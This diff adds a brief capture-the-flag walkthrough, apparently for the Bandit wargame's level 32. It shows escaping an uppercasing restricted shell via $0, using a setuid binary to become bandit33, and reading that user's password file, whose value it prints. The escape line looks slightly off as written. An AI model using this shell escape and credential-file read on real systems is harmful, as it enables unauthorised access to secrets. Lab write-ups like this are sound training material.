@@ -1,0 +1,19 @@
+when you ssh into bandit32, the default shell would be an uppercase shell
+
+>> ls
+sh: 1: LS: Permission denied
+
+The one thing in Linux that is uppercase is variables.
+$0 has a reference to a shell
+
+To escape the uppercase shell,
+: $0
+
+ls -la
+-rwsr-x---   1 bandit33 bandit32 15140 Jul 28 19:03 uppershell
+
+whoami
+bandit33
+
+cat /etc/bandit_pass/bandit33
+tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
